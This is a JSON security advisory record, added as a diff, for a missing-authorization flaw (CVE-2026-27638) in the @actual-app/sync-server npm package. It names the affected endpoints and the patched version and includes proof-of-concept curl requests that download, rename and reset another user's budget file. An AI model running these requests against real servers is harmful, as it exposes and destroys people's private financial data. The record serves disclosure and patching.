@@ -1,0 +1,59 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-02-27T19:29:47Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@actual-app/sync-server"
+  },
+  "Advisory": {
+    "DatabaseId": 339620,
+    "Id": "GSA_kwCzR0hTQS1xbWpqLXA3bTktd2pyds4ABS6k",
+    "GhsaId": "GHSA-qmjj-p7m9-wjrv",
+    "References": [
+      {
+        "Url": "https://github.com/actualbudget/actual/security/advisories/GHSA-qmjj-p7m9-wjrv"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27638"
+      },
+      {
+        "Url": "https://github.com/actualbudget/actual/commit/9966c024cb75f57943193cac8e42f401efed9d08"
+      },
+      {
+        "Url": "https://github.com/actualbudget/actual/releases/tag/v26.2.1"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-qmjj-p7m9-wjrv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-qmjj-p7m9-wjrv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-27638"
+      }
+    ],
+    "Description": "In multi-user mode (OpenID), the sync API endpoints (`/sync/*`) don't verify that the authenticated user owns or has access to the file being operated on. Any authenticated user can read, modify, and overwrite any other user's budget files by providing their file ID.\n\n## Affected Code\n\nFile: `packages/sync-server/src/app-sync.ts`\n\nThe `validateSessionMiddleware` on line 31 confirms the user is authenticated, but individual endpoints only check that the file *exists* (via `verifyFileExists`), never that the requesting user *owns* or *has access to* the file.\n\nCompare with `POST /sync/delete-user-file` (lines 394-430) which correctly checks:\n```js\nconst isOwner = file.owner === userId;\nconst isServerAdmin = isAdmin(userId);\nif (!isOwner \u0026\u0026 !isServerAdmin) { ... }\n```\n\nThis check is missing from all other endpoints.\n\n## Affected Endpoints\n\n- `GET /sync/download-user-file` - download any budget file\n- `POST /sync/upload-user-file` - overwrite any budget file\n- `POST /sync/sync` - read/write sync messages of any file\n- `POST /sync/user-get-key` - read encryption key info\n- `POST /sync/user-create-key` - change encryption key\n- `POST /sync/reset-user-file` - reset sync state\n- `POST /sync/update-user-filename` - rename file\n- `GET /sync/get-user-file-info` - read file metadata\n\n## PoC\n\nSetup: Two users (Alice, Bob) authenticated via OpenID on the same Actual server. Alice has a budget with fileId `abc-123`.\n\nBob downloads Alice's budget:\n```bash\ncurl -X GET 'https://actual.example.com/sync/download-user-file' \\\n  -H 'X-Actual-Token: \u003cbob-session-token\u003e' \\\n  -H 'X-Actual-File-Id: abc-123' \\\n  -o stolen-budget.blob\n```\n\nBob reads Alice's file metadata:\n```bash\ncurl -X GET 'https://actual.example.com/sync/get-user-file-info' \\\n  -H 'X-Actual-Token: \u003cbob-session-token\u003e' \\\n  -H 'X-Actual-File-Id: abc-123'\n```\n\nBob renames Alice's budget:\n```bash\ncurl -X POST 'https://actual.example.com/sync/update-user-filename' \\\n  -H 'X-Actual-Token: \u003cbob-session-token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"fileId\": \"abc-123\", \"name\": \"pwned\"}'\n```\n\nBob resets Alice's sync state (destructive):\n```bash\ncurl -X POST 'https://actual.example.com/sync/reset-user-file' \\\n  -H 'X-Actual-Token: \u003cbob-session-token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"fileId\": \"abc-123\"}'\n```\n\nFile IDs can be discovered by admin users via `GET /sync/list-user-files` (admins see all files), through `user_access` sharing, or by guessing.\n\n## Impact\n\nIn multi-user deployments (OpenID mode), any authenticated user can steal other users' complete financial data (transactions, accounts, balances, payees), modify or destroy their budgets, and tamper with encryption keys. This is a personal finance app, so the data is highly sensitive.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-27T19:29:46Z",
+    "Severity": "MODERATE",
+    "Summary": "@actual-app/sync-server: Missing authorization in sync endpoints allows cross-user budget file access in multi-user mode",
+    "UpdatedAt": "2026-02-27T19:29:47Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "26.2.1"
+      },
+      "VulnerableVersionRange": "\u003c= 26.2.0"
+    }
+  ]
+}
